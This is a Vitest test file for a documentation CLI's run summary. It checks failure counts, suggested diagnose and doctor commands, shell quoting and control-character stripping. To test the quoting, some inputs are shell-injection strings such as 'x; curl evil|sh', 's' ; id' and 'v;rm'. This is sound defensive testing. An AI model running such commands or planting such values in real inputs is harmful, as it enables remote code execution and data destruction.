// The closing line of a plain `docsxai run`: counts, where the outputs went, and the command that
// digs into each failure. The browser loop is stubbed; the line itself is a pure function.

import { promises as fs } from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { formatRunSummary, nextForFailure } from "../src/cli-run-summary.js";
import type { RunFlowsOptions, RunFlowsResult } from "../src/run-flows.js";

const stub = vi.hoisted(() => ({
  run: null as null | ((opts: RunFlowsOptions) => Promise<RunFlowsResult>),
}));
vi.mock("../src/run-flows.js", () => ({
  runFlowsInSessions: (opts: RunFlowsOptions) => stub.run!(opts),
}));

const { main } = await import("../src/cli.js");

describe("formatRunSummary", () => {
  it("counts the flows that ran and names the docs directory", () => {
    expect(
      formatRunSummary({ projectDir: "/ws", noun: "flows", total: 3, okCount: 3, failures: [] }),
    ).toBe(`run: 3 of 3 flows ok, outputs in ${path.join("/ws", "docs")}\n`);
  });

  it("uses the singular for one unit", () => {
    expect(
      formatRunSummary({
        projectDir: "/ws",
        noun: "flow variants",
        total: 1,
        okCount: 1,
        failures: [],
      }),
    ).toMatch(/^run: 1 of 1 flow variant ok, outputs in /);
  });

  it("lists a next command per failure", () => {
    const text = formatRunSummary({
      projectDir: "/ws",
      noun: "flows",
      total: 3,
      okCount: 1,
      failures: [
        { flow: "login", step: "submit", message: "x" },
        { flow: "tour", step: null, message: "no browser" },
      ],
    });
    expect(text).toContain("run: 2 of 3 flows failed, 1 ok; outputs in ");
    expect(text).toContain("  login: next: docsxai diagnose /ws --flow login --step submit\n");
    expect(text).toContain("  tour: next: docsxai doctor /ws\n");
  });
});

describe("nextForFailure", () => {
  it("splits a variant label into --flow and --variant", () => {
    expect(
      nextForFailure("/ws", { flow: "tour/fr-FR.dark.mobile", step: "open", message: "x" }),
    ).toBe("docsxai diagnose /ws --flow tour --step open --variant fr-FR.dark.mobile");
  });

  it("quotes a flow, step, variant or directory that is not a plain word", () => {
    expect(nextForFailure("/ws", { flow: "x; curl evil|sh", step: "s' ; id", message: "m" })).toBe(
      "docsxai diagnose /ws --flow 'x; curl evil|sh' --step 's'\\'' ; id'",
    );
    expect(nextForFailure("/my ws", { flow: "tour/v;rm", step: "open", message: "m" })).toBe(
      "docsxai diagnose '/my ws' --flow tour --step open --variant 'v;rm'",
    );
    expect(nextForFailure("/my ws", { flow: "f", step: null, message: "m" })).toBe(
      "docsxai doctor '/my ws'",
    );
  });

  it("strips control characters from the flow label of a summary line", () => {
    const text = formatRunSummary({
      projectDir: "/ws",
      noun: "flows",
      total: 1,
      okCount: 0,
      failures: [{ flow: "a\u001b[2J", step: null, message: "m" }],
    });
    expect(text).toContain("  a[2J: next: docsxai doctor /ws\n");
    expect(text).not.toContain("\u001b");
  });
});

describe("docsxai run - closing line", () => {
  let ws = "";
  let out = "";
  let err = "";

  beforeEach(async () => {
    out = "";
    err = "";
    vi.spyOn(process.stdout, "write").mockImplementation((chunk: unknown) => {
      out += String(chunk);
      return true;
    });
    vi.spyOn(process.stderr, "write").mockImplementation((chunk: unknown) => {
      err += String(chunk);
      return true;
    });
    ws = await fs.mkdtemp(path.join(os.tmpdir(), "docsxai-run-summary-"));
    await fs.mkdir(path.join(ws, "flows"), { recursive: true });
    await fs.writeFile(
      path.join(ws, "flows", "f.flow.yaml"),
      "name: f\nsteps:\n  - id: open\n    action: navigate\n    value: index.html\n",
    );
  });
  afterEach(async () => {
    vi.restoreAllMocks();
    await fs.rm(ws, { recursive: true, force: true });
  });

  it("prints the summary on stdout after a clean run", async () => {
    stub.run = async () => ({ okCount: 1, failures: [] });
    expect(await main(["run", ws])).toBe(0);
    expect(out).toContain(`run: 1 of 1 flow ok, outputs in ${path.join(ws, "docs")}\n`);
    expect(err).toBe("");
  });

  it("prints the summary and the diagnose command on stderr after a halt, exit 1", async () => {
    stub.run = async () => ({
      okCount: 0,
      failures: [{ flow: "f", step: "open", message: "boom" }],
    });
    expect(await main(["run", ws])).toBe(1);
    expect(err).toContain("run: 1 of 1 flow failed, 0 ok; outputs in ");
    expect(err).toContain(`f: next: docsxai diagnose ${ws} --flow f --step open`);
    expect(out).not.toContain("1 of 1");
  });

  it("names the available flows when --flow matches none", async () => {
    stub.run = async () => ({ okCount: 0, failures: [] });
    expect(await main(["run", ws, "--flow", "nope"])).toBe(1);
    expect(err).toContain('run: no flow named "nope" (flows: f)');
  });

  it("points an empty flows/ at calibrate", async () => {
    await fs.rm(path.join(ws, "flows", "f.flow.yaml"));
    expect(await main(["run", ws])).toBe(1);
    expect(err).toContain("no flow-files in");
    expect(err).toContain(`next: docsxai calibrate ${ws} --from <flow.yaml>`);
  });
});
